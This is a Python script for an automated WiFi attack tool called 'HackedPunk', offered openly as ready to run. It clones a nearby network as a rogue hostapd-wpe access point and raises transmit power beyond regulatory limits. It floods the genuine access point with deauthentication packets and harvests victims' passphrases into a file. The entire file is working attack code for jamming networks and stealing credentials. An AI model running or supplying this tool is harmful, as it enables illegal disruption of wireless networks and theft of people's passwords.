#!/usr/bin/env python3

import subprocess
import re
import time
import os
import sys
import threading
from scapy.all import *
import logging

# HackedPunk Logo - Massive Edition
HACKEDPUNK_LOGO = """
   ▓█████▄  ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ▓█████▄ ▓█████  ▓█████ ▓█████  ███▄    █  ██ ▄█▀
   ▒██▀ ██▌▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀  ▒██▀ ██▌▓█   ▀  ▓█   ▀ ▓█   ▀  ██ ▀█   █  ██▄█▒ 
   ░██   █▌▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███    ░██   █▌▒███    ▒███   ▒███   ▓██  ▀█ ██▓███▄░ 
   ░▓█▄   ▌░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄  ░▓█▄   ▌▒▓█  ▄  ▒▓█  ▄ ▒▓█  ▄ ▓██▒  ▐▌██▓██ █▄ 
   ░▒████▓  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒  ░▒████▓ ░▒████▒ ░▒████▒░▒████▒░██░   ▓██▒██▒ █▄
    ▒▒▓  ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░   ▒▒▓  ▒ ░░ ▒░ ░ ░░ ▒░ ░ ░░ ▒░ ░░ ▒░   ▒ ░▒ ▒▒ ▓▒
    ░ ▒  ▒   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░   ░ ▒  ▒  ░ ░  ░  ░ ░  ░  ░ ░  ░░ ▒░   ░ ░ ▒▒ ▒░
    ░ ░  ░   ░   ▒   ░        ░ ░░ ░    ░      ░ ░  ░    ░       ░       ░      ░   ░ ░ ░░ ░ 
      ░          ░  ░░ ░      ░  ░      ░  ░     ░       ░  ░    ░       ░            ░  ░  
        ░                                                                                    
   --------------------------------------------------------------------------------------------
      HACKEDPUNK - Red Team WiFi Annihilator | Signal Domination | Password Harvesting Chaos
   --------------------------------------------------------------------------------------------
"""

# Setup logging
logging.basicConfig(
    filename="hackedpunk.log",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)
logger = logging.getLogger("HackedPunk")

# Config Defaults
IFACE = "wlan0"  # Main interface
IFACE_MON = "wlan0mon"  # Monitor mode interface
HOSTAPD_CONF = "hostapd.conf"
LOG_FILE = "/var/log/hostapd-wpe.log"
OUTPUT_FILE = "captured_creds.txt"
ROGUE_MAC = "00:11:22:33:44:55"  # Default rogue AP MAC

# Global control for deauth thread
deauth_running = True

def scan_targets():
    """Scan for nearby WiFi networks and return SSID, BSSID, channel."""
    try:
        logger.info("Scanning for WiFi targets...")
        subprocess.run(["airmon-ng", "start", IFACE], check=True)  # Ensure monitor mode
        scan = subprocess.check_output(["iwlist", IFACE, "scan"], timeout=10).decode(errors="ignore")
        targets = re.findall(r"Address: (\S+).*?Channel:(\d+).*?ESSID:\"(.+?)\".*?Signal level=(-?\d+)", scan, re.DOTALL)
        if not targets:
            raise ValueError("No WiFi networks found")
        
        # Sort by signal strength (strongest first)
        targets = sorted(targets, key=lambda x: int(x[3]), reverse=True)
        
        # Auto-pick strongest or prompt user
        print("\nDetected WiFi Networks (sorted by signal strength):")
        for i, (bssid, channel, ssid, signal) in enumerate(targets, 1):
            print(f"{i}. SSID: {ssid} | BSSID: {bssid} | Channel: {channel} | Signal: {signal} dBm")
        
        if len(targets) == 1:
            choice = 0
        else:
            choice = input("\nEnter target number (or press Enter for strongest): ").strip()
            choice = 0 if not choice else int(choice) - 1
        
        target = targets[choice]
        return target[2], target[0], target[1]  # SSID, BSSID, Channel
    except subprocess.TimeoutExpired:
        logger.error("Scan timed out")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Target scan failed: {e}")
        sys.exit(1)

def setup_signal_power():
    """Max out TX power for signal dominance."""
    try:
        subprocess.run(["iw", "reg", "set", "BO"], check=True)
        subprocess.run(["ifconfig", IFACE, "down"], check=True)
        result = subprocess.run(["iwconfig", IFACE, "txpower", "30"], check=True)
        if result.returncode != 0:
            raise subprocess.CalledProcessError(result.returncode, "iwconfig")
        subprocess.run(["ifconfig", IFACE, "up"], check=True)
        logger.info("Signal power maxed out at 30 dBm")
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to set TX power: {e}")
        sys.exit(1)

def generate_hostapd_conf(ssid, channel):
    """Create hostapd-wpe config with auto-detected SSID and channel."""
    try:
        with open(HOSTAPD_CONF, "w") as f:
            f.write(f"""interface={IFACE}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
ieee80211n=1
""")
        logger.info(f"Generated {HOSTAPD_CONF} for SSID: {ssid}, Channel: {channel}")
    except IOError as e:
        logger.error(f"Failed to write hostapd.conf: {e}")
        sys.exit(1)

def deauth_all(target_ap_mac):
    """Mass deauth all clients from target AP."""
    global deauth_running
    try:
        logger.info(f"Starting mass deauth on {target_ap_mac}")
        pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_ap_mac, addr3=target_ap_mac)/Dot11Deauth()
        while deauth_running:
            sendp(pkt, iface=IFACE_MON, count=50, inter=0.1, verbose=False)
            time.sleep(1)
    except Exception as e:
        logger.error(f"Deauth thread crashed: {e}")
    finally:
        logger.info("Deauth thread stopped")

def kick_client(mac):
    """Deauth a specific client after password capture."""
    try:
        pkt = RadioTap()/Dot11(addr1=mac, addr2=ROGUE_MAC, addr3=ROGUE_MAC)/Dot11Deauth()
        sendp(pkt, iface=IFACE_MON, count=10, inter=0.1, verbose=False)
        logger.info(f"Kicked client {mac}")
    except Exception as e:
        logger.error(f"Failed to kick {mac}: {e}")

def capture_and_release():
    """Monitor hostapd-wpe log, capture passwords, and release clients."""
    try:
        if not os.path.exists(LOG_FILE):
            raise FileNotFoundError(f"{LOG_FILE} not found—ensure hostapd-wpe is running")
        
        captured = set()
        last_pos = 0
        
        logger.info("Starting password capture and release loop")
        while True:
            with open(LOG_FILE, "r") as log:
                log.seek(last_pos)
                lines = log.readlines()
                last_pos = log.tell()
                mac = None
                for line in lines:
                    mac_match = re.search(r"STA: (\S+)", line)
                    pwd_match = re.search(r"Passphrase: (.+)", line)
                    if mac_match:
                        mac = mac_match.group(1)
                    if pwd_match and mac and mac not in captured:
                        password = pwd_match.group(1).strip()
                        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                        entry = f"{timestamp} | MAC: {mac} | Passphrase: {password}"
                        print(entry)
                        logger.info(entry)
                        with open(OUTPUT_FILE, "a") as f:
                            f.write(f"{entry}\n")
                        captured.add(mac)
                        kick_client(mac)
            time.sleep(1)
    except FileNotFoundError as e:
        logger.error(f"Capture failed: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Capture loop crashed: {e}")
        sys.exit(1)

def main():
    """Run HackedPunk fully automated."""
    print(HACKEDPUNK_LOGO)
    print("Starting HackedPunk - WiFi Domination Tool")
    logger.info("HackedPunk initialized")
    
    # Auto-detect target
    TARGET_SSID, TARGET_AP_MAC, CHANNEL = scan_targets()
    print(f"Targeting: SSID={TARGET_SSID} | BSSID={TARGET_AP_MAC} | Channel={CHANNEL}")
    
    # Setup
    try:
        setup_signal_power()
        generate_hostapd_conf(TARGET_SSID, CHANNEL)
        
        # Start hostapd-wpe
        hostapd_proc = subprocess.Popen(["hostapd-wpe", HOSTAPD_CONF])
        logger.info("hostapd-wpe launched")
        time.sleep(2)
        
        if hostapd_proc.poll() is not None:
            raise RuntimeError("hostapd-wpe failed to start")
        
        # Start mass deauth thread
        deauth_thread = threading.Thread(target=deauth_all, args=(TARGET_AP_MAC,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Run capture and release
        capture_and_release()
        
    except KeyboardInterrupt:
        print("\nShutting down HackedPunk...")
        logger.info("User interrupted - shutting down")
        global deauth_running
        deauth_running = False
        if 'hostapd_proc' in locals():
            hostapd_proc.terminate()
        time.sleep(1)
        sys.exit(0)
    except Exception as e:
        logger.error(f"Main loop failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()